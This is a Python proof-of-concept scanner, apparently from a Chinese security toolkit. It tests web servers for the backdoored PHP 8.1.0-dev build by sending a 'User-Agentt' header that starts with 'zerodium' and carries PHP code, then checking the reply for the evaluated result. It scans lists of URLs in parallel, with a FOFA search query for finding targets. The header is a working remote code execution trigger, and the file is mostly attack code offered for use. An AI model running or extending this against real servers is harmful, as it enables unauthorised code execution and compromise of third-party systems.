#FOFA: body=".php"

import urllib
from urllib import request
import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool
import random

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    relsult = {
        'name': 'PHP 8.1.0-dev 开发版本后门',
        'vulnerable': False
    }
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'User-Agentt': 'zerodiumvar_dump(233*233);',
        'Connection': 'close',
    }
    try:
        rep = requests.get(target, headers=headers, timeout=3)
        if re.search('int\(54289\)', rep.text):
            relsult['vulnerable'] = True
            relsult['url'] = target
            relsult['method'] = 'GET'
            relsult['payload'] = headers['User-Agentt']
        print (relsult)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("PHP 8.1.0-dev 开发版本后门漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()